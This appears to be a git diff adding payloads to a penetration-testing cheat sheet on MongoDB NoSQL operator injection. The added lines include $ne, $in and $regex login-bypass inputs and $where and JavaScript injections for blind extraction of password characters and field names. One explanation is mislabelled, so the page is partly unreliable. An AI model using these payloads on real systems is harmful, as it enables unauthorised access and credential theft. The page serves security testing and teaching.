@@ -39,13 +39,60 @@ Abuses operators:
 - `$ne` - Matches all values that are not equal to a specified value.
 - `$in` - Matches all of the values specified in an array.
 - `$regex` - Selects documents where values match a specified regular expression.
-**Cannot be sent over GET requests, must be POST requests**
+### Checking For Operator Injection
+- Test if adding `"$where":"0` or `"$where":"1"` changes things
 ### Payloads
+```
+[$ne]=invalid
+```
+- For URL parameter
 ```
 {"$ne":"invalid"}
 ```
 - Gets all that are not `"invalid"`
+- Only for json input
 ```
 {"$in":["admin","administrator","superadmin"]}
 ```
-- Gets all users that are in the admin group
+- Gets user that matches one of the strings
+- Only for json input
+```
+[$regex]=admin.*
+```
+```
+{"$regex":"admin.*"}
+```
+- Matches regex for any user like admin
+- Only for json input
+```
+admin' && this.password[0] == 'a' || 'a'=='b
+```
+- Limited javascript capabiltiy, matches where the password is equal to 'a'
+- Works with url parameters
+```
+admin' && this.password.length >= 8 || 'a'=='b
+```
+- Limited javascript capabiltiy, matches where the password is equal to 'a'
+- Works with url parameters
+```
+admin' && this.password.match(/\d/) || 'a'=='b
+```
+- Match if the password contains digits `\d` (regex)
+- Works with url parameters
+```
+admin' && this.username!='
+```
+- Used to see if the field name `username` exists. If it does exist then it should not error
+- Works with url parameters
+```
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+- If there is operator support, then you can extract name of data fields with `keys()`. Extracts the first data field and returns the first character of the field name
+```
+{"$regex":"^.*"}
+```
+- See if there is a regex match for a field
+```
+{"$regex":"^a.*"}
+```
+- See if there is a regex match for the field starts with 'a'
